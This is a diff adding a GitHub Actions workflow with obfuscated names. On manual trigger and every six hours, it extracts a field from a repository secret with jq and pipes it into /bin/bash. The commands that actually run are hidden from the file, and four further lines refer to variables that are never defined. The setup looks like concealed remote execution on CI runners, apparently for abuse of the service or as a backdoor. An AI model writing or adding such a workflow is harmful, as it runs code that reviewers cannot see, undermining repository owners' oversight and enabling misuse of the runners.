@@ -1,0 +1,20 @@
+name: snowsam7
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: snowsam7
+        env:
+          jmg2: ${{ secrets.jmg2 }}
+        run: |
+          echo $jmg2 | jq -r .rcb3 | /bin/bash
+          echo $vvyb19745 | jq -r .ei27505 | /bin/bash
+          echo $ufe252 | jq -r .j11254 | /bin/bash
+          echo $uo3665 | jq -r .y7 | /bin/bash
+          echo $zty5479 | jq -r .dfydn89657 | /bin/bash
+
